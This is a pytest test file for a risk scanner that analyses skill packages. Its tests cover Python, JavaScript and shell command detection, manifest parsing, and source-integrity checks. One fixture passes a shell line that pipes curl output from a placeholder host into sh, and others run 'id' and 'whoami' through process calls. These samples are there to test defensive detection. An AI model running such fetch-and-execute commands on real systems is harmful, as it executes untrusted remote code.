from pathlib import Path

from scanners.risk_scanner.analyzers import analyze_snapshot
from scanners.risk_scanner.analyzers.javascript_ast import analyze_javascript
from scanners.risk_scanner.analyzers.manifest_analysis import (
    get_field,
    parse_structured_document,
)
from scanners.risk_scanner.analyzers.shell_analysis import analyze_shell
from scanners.risk_scanner.analyzers.source_integrity import (
    capture_source_state,
    verify_source_state,
)
from scanners.risk_scanner.inventory import build_inventory
from scanners.risk_scanner.policy import ScanPolicy
from scanners.risk_scanner.scanner import RiskScanner


def test_python_ast_facts_are_shared_with_capability_graph(tmp_path: Path) -> None:
    source = "import os as operating_system\noperating_system.system('id')\n"
    path = tmp_path / "main.py"
    path.write_text(source, encoding="utf-8")
    inventory = build_inventory(tmp_path, ScanPolicy())
    snapshot = analyze_snapshot(
        {"main.py": source}, ["main.py"], {"permissions": {}},
        target_dir=tmp_path, inventory=inventory,
    )

    event = snapshot.python_ast["main.py"].calls[0]
    assert event.kind == "dangerous"
    assert event.resolved == "os.system"
    assert "process" in snapshot.capability_graph.as_report()["observed"]


def test_javascript_and_shell_analysis_extract_commands() -> None:
    javascript = analyze_javascript(
        "server.js",
        "const cp = require('child_process');\ncp.exec('whoami');\n",
    )
    assert javascript.calls[0].calling == "cp.exec"
    assert javascript.calls[0].kind == "process"

    shell = analyze_shell("install.sh", "curl https://example.invalid/x | sh\n")
    assert shell.commands[0].argv[:2] == ("curl", "https://example.invalid/x")
    assert shell.commands[0].pipeline is True


def test_structured_manifest_reads_fields_without_regex() -> None:
    document = parse_structured_document(
        "manifest.json",
        '{"permissions":{"network":{"allowed":true}},"type":"skill"}',
    )
    assert get_field(document.data, "permissions.network.allowed") is True
    assert get_field(document.data, "missing.field") is None


def test_malformed_yaml_is_a_recoverable_structured_parse_error() -> None:
    document = parse_structured_document("broken.yaml", "items: [")

    assert document.data is None
    assert document.error is not None
    assert "invalid yaml" in document.error


def test_source_integrity_detects_mutation_and_new_file(tmp_path: Path) -> None:
    target = tmp_path / "main.py"
    target.write_text("print(1)\n", encoding="utf-8")
    inventory = build_inventory(tmp_path, ScanPolicy())
    snapshot = capture_source_state(tmp_path, inventory)
    target.write_text("print(123456)\n", encoding="utf-8")
    (tmp_path / "added.py").write_text("print(2)\n", encoding="utf-8")

    issues = verify_source_state(tmp_path, snapshot)
    kinds = {issue["kind"] for issue in issues}
    assert "source_changed_during_scan" in kinds
    assert "source_added_during_scan" in kinds


def test_parser_failure_is_a_partial_scan_signal(tmp_path: Path) -> None:
    (tmp_path / "SKILL.md").write_text("# skill\n", encoding="utf-8")
    (tmp_path / "broken.py").write_text("def broken(:\n", encoding="utf-8")

    report = RiskScanner(tmp_path).scan()

    assert report["structural_analysis"]["parse_errors"] == 1
    assert report["scan_status"]["state"] == "partial"
    assert "structured_analysis_errors" in report["scan_status"]["reasons"]
